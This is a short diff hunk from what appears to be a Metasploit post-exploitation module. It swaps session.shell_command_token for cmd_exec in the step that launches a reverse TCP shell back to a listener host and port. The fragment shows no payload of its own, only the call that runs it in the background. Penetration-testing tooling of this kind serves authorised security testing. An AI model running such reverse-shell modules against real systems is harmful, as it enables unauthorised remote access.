@@ -59,7 +59,7 @@ class Metasploit3 < Msf::Post
 
     if not cmd.empty?
       print_status("Executing reverse tcp shel to #{lhost} on port #{lport}")
-      session.shell_command_token("(#{cmd} &)")
+      cmd_exec("(#{cmd} &)")
     end
   end
 
